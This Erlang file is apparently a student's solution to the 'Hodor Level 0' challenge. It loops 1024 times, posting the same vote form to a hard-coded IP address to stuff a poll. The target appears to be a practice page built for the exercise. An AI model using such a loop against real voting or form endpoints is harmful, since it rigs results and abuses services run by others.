%% ===-----Hodor Level 0---------------------------------------------===
%%          Hodor Level 0 Project, by Julien Barbier.
%%  "Make 1024 votes in this page: http://173.246.108.142/level0.php"
%%  Solution using Erlang code.
%%
%%  by Alexandro de Oliveira.
%% ===---------------------------------------------------------------===

-module(hodor0).
-export([main/0]).

posting() ->
Method = post,
URL = "http://173.246.108.142/level0.php",
Header = [{"User-Agent","havk64 Erlang Requests"}],
Type = "application/x-www-form-urlencoded",
Body = "id=23&holdthedoor=submit",
ssl:start(),
application:start(inets),
httpc:request(Method,
    {URL, Header, Type, Body }, [], []).

for(0,_) ->
   [];
   for(N,Term) when N > 0 ->
   posting(),
   [Term|for(N-1,Term)].


main() ->
    for(1024, 1).
